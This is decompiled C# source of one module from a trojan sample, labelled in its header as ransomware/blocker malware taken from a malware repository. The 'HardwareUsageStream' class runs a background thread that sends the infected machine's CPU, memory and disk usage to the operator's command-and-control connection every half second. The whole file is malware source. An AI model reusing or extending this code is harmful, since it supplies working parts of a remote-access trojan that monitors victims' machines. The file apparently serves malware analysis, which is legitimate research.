// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.HardwareUsageStream
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Permissions;
using System.Text;
using System.Threading;

namespace VanillaStub.Helpers.Services
{
  public static class HardwareUsageStream
  {
    private static Thread HardwareUsageThread = new Thread(new ThreadStart(HardwareUsageStream.StartHardwareUsage));

    public static bool HardwareUsageActive { get; set; }

    [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
    public static void Start()
    {
      if (HardwareUsageStream.HardwareUsageActive)
        return;
      HardwareUsageStream.HardwareUsageActive = true;
      try
      {
        HardwareUsageStream.HardwareUsageThread.Start();
      }
      catch
      {
      }
    }

    [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
    public static void Stop()
    {
      if (!HardwareUsageStream.HardwareUsageActive)
        return;
      HardwareUsageStream.HardwareUsageActive = false;
      try
      {
        HardwareUsageStream.HardwareUsageThread.Abort();
        HardwareUsageStream.HardwareUsageThread = new Thread(new ThreadStart(HardwareUsageStream.StartHardwareUsage));
      }
      catch
      {
      }
    }

    public static void StartHardwareUsage()
    {
      PerformanceCounter performanceCounter1 = new PerformanceCounter("Processor", "% Processor Time", "_Total");
      PerformanceCounter performanceCounter2 = new PerformanceCounter("Memory", "Available MBytes");
      PerformanceCounter performanceCounter3 = new PerformanceCounter("PhysicalDisk", "% Disk Time", "_Total");
      while (HardwareUsageStream.HardwareUsageActive)
      {
        string s = "{" + (object) performanceCounter1.NextValue() + "}[" + (object) performanceCounter2.NextValue() + "]<" + (object) performanceCounter3.NextValue() + ">";
        List<byte> byteList = new List<byte>();
        byteList.Add((byte) 10);
        byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(s));
        VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
        Thread.Sleep(500);
      }
    }
  }
}
